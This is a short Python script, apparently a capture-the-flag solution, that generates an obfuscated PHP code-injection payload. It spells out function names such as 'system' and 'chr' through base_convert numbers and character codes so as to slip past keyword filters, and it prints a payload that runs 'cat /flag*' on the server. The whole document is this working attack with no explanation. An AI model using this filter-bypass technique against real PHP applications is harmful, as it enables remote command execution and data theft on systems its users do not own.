def convert(cmd):
    return ".".join([f"base_convert({ord(l) - 97 + 10},10,36)" for l in cmd])

def convert_payload(payload):
    return ".".join([f"({convert('chr')})({ord(ch)})" for ch in payload])

print(f"({convert('system')})(({convert_payload('cat /flag*')}))")